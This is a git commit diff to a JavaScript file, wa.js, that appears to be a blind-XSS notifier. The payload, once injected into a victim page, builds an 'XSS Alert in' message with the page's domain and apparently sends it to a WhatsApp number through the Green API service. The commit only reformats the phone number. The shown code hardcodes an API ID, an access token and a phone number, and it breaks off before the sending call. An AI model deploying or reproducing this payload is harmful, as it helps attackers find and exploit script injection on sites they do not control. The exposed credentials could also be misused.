5e8732526a25fb7a8377c6582eeaa209e66b24af
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2024-02-15 07:01:57 +0100

    Update wa.js

--- wa.js
+++ wa.js
@@ -1,6 +1,6 @@
 var greenApiId = '7103905514'; // Replace with your Green API ID
 var greenApiToken = 'a73d4e98539945968bd6f1bbac660b95a3e06dcf96b24100ab'; // Replace with your Green API Token
-var defaultPhoneNumber = '18056009130'; // Replace with your default phone number
+var defaultPhoneNumber = '18056009130@c.us'; // Replace with your default phone number
 
 function sendWhatsAppMessage(greenApiId, greenApiToken, phoneNumber) {
     var textData = 'XSS Alert in ' + document.domain +
